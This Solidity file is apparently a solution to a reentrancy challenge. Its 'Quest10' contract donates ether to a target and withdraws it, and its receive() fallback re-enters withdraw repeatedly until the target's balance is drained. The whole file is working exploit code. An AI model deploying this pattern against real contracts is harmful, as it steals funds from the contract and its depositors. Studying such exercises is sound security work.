//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;

    function balanceOf(address _who) external view returns (uint256);
}

contract Quest10 is Ownable {
    uint256 _amount;

    function attack(address reentranceAddress) public payable onlyOwner {
        require(msg.value > 0, "msg.value must be greater than 0");
        _amount = msg.value;
        IReentrance(reentranceAddress).donate{value: _amount}(address(this));
        IReentrance(reentranceAddress).withdraw(_amount);
    }

    receive() external payable {
        console.log("Received", msg.value, "from", msg.sender);
        if (address(msg.sender).balance != 0) {
            IReentrance(msg.sender).withdraw(_amount);
        }
    }
}
